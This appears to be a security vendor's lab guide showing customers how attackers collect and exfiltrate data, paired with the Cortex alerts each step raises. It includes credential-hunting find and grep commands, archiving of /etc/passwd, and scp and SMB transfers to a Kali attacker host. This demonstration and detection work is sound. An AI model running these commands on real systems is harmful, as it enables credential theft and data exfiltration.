# Tactic: Collection & Exfiltration

**MITRE:** TA0009 — Collection · TA0010 — Exfiltration
**Purpose for this guide:** Show customers how attackers locate, package, and transfer sensitive data off compromised hosts. Cortex detects file search patterns, compression, and large transfers — this guide walks through each step of the data theft kill chain.

**Range variables used in this guide**

| Variable | What it represents |
|---|---|
| `<WIN_CLIENT_IP>` | Windows 11 client IP |
| `<LINUX_IP>` | Ubuntu 24.04 target IP |
| `<KALI_IP>` | Kali attacker IP |
| `<PORT>` | Transfer port |
| `<USERNAME>` | Username |
| `<PASSWORD>` | Password |

---

## Tool 1 — find / grep: Locate Sensitive Files

**What it does:** Attackers search for high-value files — credentials, config files, documents, SSH keys, and database files — before exfiltrating them. These search commands are fast and require no special tools, making them a first step on any compromised host.

**MITRE:** T1083 — File and Directory Discovery · T1552 — Unsecured Credentials
**Targets:** Linux · Windows
**Demo time:** ✅ Fast (~15 seconds)

---

### Give it a try

**Step 1 — Search for interesting files on Linux**

```
find / -name "*.conf" -o -name "*.key" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -20
```

**Step 2 — Search for password strings in files**

```
grep -ri "password" /home /etc /var/www 2>/dev/null | grep -v "Binary" | head -20
```

**Step 3 — On Windows (run in target shell), find interesting documents**

```
dir /s /b C:\Users\*.txt C:\Users\*.docx C:\Users\*.xlsx 2>nul | head
```

**What to look for:** SSH keys, database credentials, config files with plaintext passwords, and sensitive documents.

---

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/01-find-sensitive.png`
*Show: find and grep output locating sensitive files or credential strings*

**What Cortex sees**
> **Alert:** Possible Search For Password Files · Extracting credentials from Unix files
> **Severity:** Medium | **MITRE:** T1083, T1552

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/01-find-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 2 — tar / zip: Archive Before Exfiltration

**What it does:** Attackers compress and optionally encrypt data before exfiltrating it — reducing transfer size and obscuring contents from DLP/network inspection. Cortex monitors compression tool usage, especially with password protection.

**MITRE:** T1560.001 — Archive Collected Data: Archive via Utility
**Targets:** Linux · Windows
**Demo time:** ✅ Fast (~10 seconds)

---

### Give it a try

**Step 1 — Create a password-protected archive on Linux**

```
tar czf /tmp/exfil.tar.gz /etc/passwd /etc/hostname && gzip -d /tmp/exfil.tar.gz 2>/dev/null; tar czf /tmp/exfil.tgz /tmp/exfil.tar 2>/dev/null; zip -r -P "demo123" /tmp/exfil.zip /etc/hostname
```

**Step 2 — Simpler demo — just compress a directory**

```
tar czf /tmp/demo-archive.tgz /var/log/syslog 2>/dev/null && ls -lh /tmp/demo-archive.tgz
```

**What to look for:** The archive file created. Note the size reduction from compression.

---

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/02-archive.png`
*Show: tar/zip command creating an archive, ls -lh confirming file size*

**What Cortex sees**
> **Alert:** Unusual compressed file password protection · Compressing data using python
> **Severity:** Medium | **MITRE:** T1560.001

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/02-archive-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 3 — scp / ssh: Exfiltrate Over SSH

**What it does:** Attackers use SCP (Secure Copy over SSH) to transfer collected data back to their system. It blends into normal SSH traffic, uses encryption, and is available on virtually every Linux host. The transfer size and destination make it visible to Cortex.

**MITRE:** T1048.002 — Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
**Targets:** Linux (source) → Kali (destination)
**Demo time:** ✅ Fast (~15 seconds)

---

### Give it a try

**Step 1 — From the Linux target, SCP a file to Kali**

```
scp /etc/hostname <USERNAME>@<KALI_IP>:/tmp/exfil-demo.txt
```

**Step 2 — Verify receipt on Kali**

```
ls -lh /tmp/exfil-demo.txt && cat /tmp/exfil-demo.txt
```

**What to look for:** The file appears on Kali. The SCP transfer shows up as SSH traffic with a large data payload if archiving a directory.

---

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/03-scp-exfil.png`
*Show: scp transfer completing, file confirmed received on Kali*

**What Cortex sees**
> **Alert:** A compressed file was exfiltrated over SSH · Rare SSH Session · Unusual SSH Activity
> **Severity:** High | **MITRE:** T1048.002

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/03-scp-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 4 — impacket-smbserver: Exfiltrate from Windows via SMB

**What it does:** Attackers stand up a temporary SMB share on Kali to pull files off a Windows target. The Windows host copies files to what looks like a network share — but it's Kali's impacket-smbserver receiving them. No additional software needed on the Windows side.

**MITRE:** T1039 — Data from Network Shared Drive · T1048 — Exfiltration Over Alternative Protocol
**Targets:** Windows Client · DC → Kali
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Start the SMB server on Kali**

```
impacket-smbserver share /tmp/smb-exfil -smb2support
```

**Step 2 — From the Windows target shell, copy a file to the Kali share**

```
copy C:\Windows\System32\drivers\etc\hosts \\<KALI_IP>\share\hosts.txt
```

**Step 3 — Verify on Kali**

```
ls /tmp/smb-exfil/
```

**What to look for:** The impacket server shows the incoming connection and file transfer. The file appears in `/tmp/smb-exfil/`.

---

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/04-impacket-smbserver.png`
*Show: impacket smbserver logging the connection and file transfer from Windows*

**What Cortex sees**
> **Alert:** Rare file transfer over SMB protocol · Rare SMB session to a remote host · SMB Traffic from Non-Standard Process
> **Severity:** High | **MITRE:** T1039, T1048

📸 **Screenshot:** `screenshots/08-collection-and-exfiltration/04-smbserver-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*
